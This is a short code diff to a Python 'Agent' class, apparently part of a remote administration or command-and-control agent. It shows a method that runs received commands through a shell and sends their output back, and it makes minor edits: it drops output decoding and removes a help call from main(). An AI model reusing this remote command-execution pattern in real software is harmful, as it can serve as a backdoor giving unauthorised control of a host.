@@ -115,7 +115,7 @@ class Agent(object):
         try:
             proc = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             out, err = proc.communicate()
-            output = (out + err).decode('utf8')
+            output = (out + err)
             self.send_output(output)
         except Exception as exc:
             self.send_output(traceback.format_exc())
@@ -355,7 +355,6 @@ class Agent(object):
 
 def main():
     agent = Agent()
-    agent.help()
     agent.run()
 
 if __name__ == "__main__":
